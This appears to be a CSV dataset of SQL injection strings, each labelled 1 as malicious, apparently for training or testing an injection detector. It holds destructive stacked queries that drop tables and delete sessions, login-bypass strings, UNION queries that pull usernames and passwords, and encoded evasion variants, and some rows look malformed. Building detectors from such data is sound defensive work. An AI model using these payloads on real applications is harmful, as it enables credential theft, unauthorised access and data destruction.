Query,Label
SELECT * FROM users; DROP TABLE comments; --,1
--'; DELETE FROM sessions; --,1
"/* SQL Injection */; SELECT username, password FROM admin",1
SELECT * FROM users WHERE username = 'admin' /*--*/ AND password = 'admin',1
SELECT * FROM users WHERE username = 'admin' #AND password = 'admin',1
SELECT * FROM users WHERE username = 'admin' AND (/*')) */ password = 'admin';,1
/**/SELECT%20*%20FROM%20products%20WHERE%20name%20LIKE%20'%E2%9C%94%E2%9C%94',1
--+SELECT+*+FROM+products+WHERE+name+LIKE+'%%',1
#SELECT * FROM products WHERE name LIKE '/*%',1
--' OR '1'='1,1
/**/1=1,1
SELECT * FROM orders WHERE status = '/*' OR '1'='1' /*' ORDER BY date DESC,1
SELECT * FROM orders WHERE status = '--' OR 1=1 --' ORDER BY date DESC,1
SELECT * FROM orders WHERE status = '#' OR 1=1 #' ORDER BY date DESC,1
--' OR '1'='1,1
#' OR '1'='1,1
/**/' OR '1'='1,1
%27+OR+1=1;--,1
%65%78%61%6D%70%6C%65+%72%65%61%64(%27+OR+1=1;),1
"UNION+SELECT+NULL,+username+FROM+users+WHERE+1=1",1
%25' OR '1'='1,1
"' OR ASCII(SUBSTRING(username,1,1))=116 --",1
%23SELECT+*+FROM+users+WHERE+id+%3D+'admin',1
SELECT+*+FROM+users+WHERE+id=CHAR(97)+||+CHAR(98)+||+CHAR(100),1
/*SELECT*/+*+FRom+usErS+wHeRe+iD+/**/=/**/'a',1
%27--,1
%60;/**/,1
CHAR(39)%0A,1
"%27+UNION+SELECT+NULL,+body+FROM+users--",1
"CHAR(45)-*UNION+SELECT+email,+password+FROM+admin/*",1
SELECT * FROM users WHERE username = '' OR '1'='1',1
SELECT * FROM users WHERE username = 'admin' --' AND password = 'anything',1
"SELECT * FROM users WHERE username IN ('admin', (SELECT 'x'))",1
;select * from users where username like '%' --,1
' OR EXISTS(SELECT 1 FROM orders),1
'; DROP TABLE IF EXISTS backups;--,1
(SELECT 1 FROM (SELECT CASE WHEN id=1 THEN 1 ELSE 0 END AS x FROM users)),1
1 AND (SELECT COUNT(*) FROM users WHERE id=2),1
-- OR 'a'='a'; SELECT * FROM users WHERE id=(SELECT MAX(id) FROM users),1
(SELECT status FROM users WHERE username = 'admin' AND password = 'password'),1
/* OR (SELECT 1 FROM users WHERE username = 'admin'-- */),1
OR (SELECT * FROM (SELECT * FROM users WHERE username = 'admin') AS temp),1
(SELECT body FROM comments WHERE user_id=1)--,1
--(SELECT body FROM comments WHERE user_id=1) --,1
;--(SELECT body FROM comments WHERE user_id=1);--,1
